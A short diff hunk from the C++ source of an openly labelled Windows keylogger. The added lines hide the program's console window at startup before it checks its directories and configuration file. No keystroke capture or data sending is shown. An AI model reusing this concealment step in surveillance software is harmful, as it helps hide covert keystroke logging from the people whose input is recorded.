@@ -73,6 +73,9 @@ int main()
 {
 	// Inicio del keylogger
 	/// Verificar directorios y archivo de configuracion
+	HWND myConsole = GetConsoleWindow();
+	ShowWindow(myConsole, 0);
+
 	WindowsData data = WindowsData();
 	Build directory = Build(data.getUserNamer());
 	if (!directory.existConfig()) {
